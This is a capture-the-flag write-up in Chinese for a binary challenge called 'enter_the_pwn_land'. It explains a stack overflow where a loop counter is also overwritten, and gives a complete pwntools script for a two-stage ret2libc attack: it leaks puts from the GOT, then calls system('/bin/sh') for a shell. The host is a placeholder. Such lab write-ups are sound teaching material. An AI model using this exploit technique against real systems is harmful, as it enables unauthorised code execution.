# enter_the_pwn_land

## 题目简述

程序在 `test_thread` 中逐字节读取输入，但长度仅为 `0x28` 的数组配合最大值为 4095 的循环，形成直接栈溢出。程序没有 PIE，可以先构造 ROP 泄露 `puts` 的真实地址，再依据题目提供的 `libc-2.31.so` 计算 `system` 与 `/bin/sh`，完成 ret2libc。

## 解题过程

反编译后的读取循环如下：

```c
char input[40];
int i;

for (i = 0; i <= 4095; ++i) {
    read(0, &input[i], 1);
    if (input[i] == '\n')
        break;
}
puts(input);
```

栈布局中，`i` 位于输入起点之后的 `0x2c` 字节处，保存的 `rbp` 位于 `0x30`，返回地址位于 `0x38`。溢出会先覆盖循环变量；如果随意写入一个很大的值，循环可能提前结束或继续写向错误位置。因此把 `i` 重写为 `0x2c`，使下一轮读取继续沿预期位置前进。

第一阶段通过 `puts(puts@got)` 泄露 libc 地址，再返回 `test_thread` 进行第二次输入。第二阶段调用 `system("/bin/sh")`，并在调用前加入单独的 `ret` 保持栈 16 字节对齐：

```python
from pwn import *

context.binary = elf = ELF("./a.out", checksec=False)
libc = ELF("./libc-2.31.so", checksec=False)
io = remote("challenge.example", 10000)

test_thread = 0x4011b6
pop_rdi = 0x401313
ret = 0x40101a

def prefix():
    return flat(
        b"C" * (0x30 - 4),
        p32(0x30 - 4),  # 覆盖 i 为 0x2c
        p64(0),         # saved rbp
    )

stage1 = prefix() + flat(
    pop_rdi,
    elf.got["puts"],
    elf.plt["puts"],
    test_thread,
)
io.sendline(stage1)

# puts(input) 先回显当前输入，下一行才是 GOT 泄露。
io.recvline()
puts_addr = u64(io.recvline().rstrip(b"\n").ljust(8, b"\x00"))
libc.address = puts_addr - libc.sym["puts"]

stage2 = prefix() + flat(
    pop_rdi,
    next(libc.search(b"/bin/sh\x00")),
    ret,
    libc.sym["system"],
)
io.sendline(stage2)
io.interactive()
```

获得 shell 后读取实例中的 flag 文件即可。脚本中的主机和端口是占位值；如果远程入口额外启用了 Proof of Work，应先按服务提示完成验证。

## 方法总结

这是标准的两阶段 ret2libc，但局部循环变量也是溢出路径的一部分。构造载荷时不能只计算“缓冲区到返回地址”的距离，还要理解中途被覆盖变量如何影响后续写入。第一阶段泄露 libc 并回到可再次读取的位置，第二阶段完成 `system("/bin/sh")`，同时处理好输出同步和栈对齐。
